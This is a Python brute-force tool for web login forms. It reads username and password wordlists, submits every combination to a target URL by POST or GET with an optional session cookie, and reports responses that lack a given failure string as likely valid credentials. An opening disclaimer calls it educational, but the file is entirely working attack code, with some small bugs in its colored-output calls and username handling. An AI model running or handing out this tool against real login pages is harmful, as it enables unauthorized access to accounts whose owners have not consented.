"""Disclaimer: This script should NEVER be utilized for malicious purposes. This has been created to help learn.
This script will not get past 2FA and Captcha. Most apps will lock out an account after a certain amount of failed
attempts. This script will not bypass that."""

import requests
from termcolor import colored

# Input Constants
URL = input("[+] What is the target URL--> ")
USERNAMES_FILE = input("[+] What is the usernames file you would like to utilize--> ")
PASSWORDS_FILE = input("[+] What is the passwords file you would like to utilize--> ")
LOGIN_FAILED = input("[+] Enter a string from app when login fails that will indicate a failed login--> ")
# User will need to inspect app source code for values below
USERNAME_INPUT = input('[+] Specify "name field" for Username Input Box--> ')
PASSWORD_INPUT = input('[+] Specify "name field" for Password Input Box--> ')
SUBMIT_NAME = input('[+] Specify "name field" for Submit/Login Button--> ')
SUBMIT_TYPE = input('[+] Specify "type field" for Submit/Login Button--> ')
COOKIE_VALUE = input("[+] Enter Cookie Value. Include full Cookie value. (Optional, leave blank if none)--> ")


# Run through possible combinations of usernames and passwords
def combos(username_list, passwords_list, url):
	correct_combos = 0
	for username in username_list:
		for password in passwords_list:
			password = password.strip()
			print(colored(f"[+] Trying USERNAME = {username} & PASSWORD = {password}..."), "blue")
			# Primarily utilized to brute force into main login page of app with "POST" request
			if COOKIE_VALUE == "":
				data = {USERNAME_INPUT: username, PASSWORD_INPUT: password, SUBMIT_NAME: SUBMIT_TYPE}
				response = requests.post(url=url, data=data)
				if LOGIN_FAILED in response.content.decode():
					pass
				else:
					print(colored(f"[+] Found possible combination --> USERNAME = {username} & PASSWORD = {password}"), "green")
					correct_combos += 1
			# Primarily utilized to brute force into another login page after the main login page with "GET" request
			else:
				data = {USERNAME_INPUT: username, PASSWORD_INPUT: password, SUBMIT_NAME: SUBMIT_TYPE, "Cookie": COOKIE_VALUE}
				# It is possible that the name of the "Cookie" field may be different from shown below
				response = requests.get(url=url, params=data, cookies={"Cookie": COOKIE_VALUE})
				if LOGIN_FAILED in response.content.decode():
					pass
				else:
					print(colored(f"[+++] Found possible combination --> USERNAME = {username} & PASSWORD = {password}"), "green")
					correct_combos += 1
	if correct_combos != 0:
		print(colored(f"[+] A total of {correct_combos} possible combinations have been found..."), "green")
	else:
		print(colored("[-] No combinations were found. Exiting program."), "red")


# Open files provided and create lists from them
with open(USERNAMES_FILE, "r") as u:
	usernames = u.readlines()
	print(colored(f"[+] Usernames Detected in file--> {len(usernames)} Usernames"), "blue")
with open(PASSWORDS_FILE, "r") as p:
	passwords = p.readlines()
	print(colored(f"[+] Passwords Detected in file--> {len(passwords)} Passwords"), "blue")
	print(colored(f"[+] There are a total of {len(usernames) * len(passwords)} combinations possible..."), "blue")
	print(colored("[+] Beginning Brute Force Attack on Target App. Please Wait..."), "blue")

# Run function to brute force username and password
combos(username_list=usernames, passwords_list=passwords, url=URL)
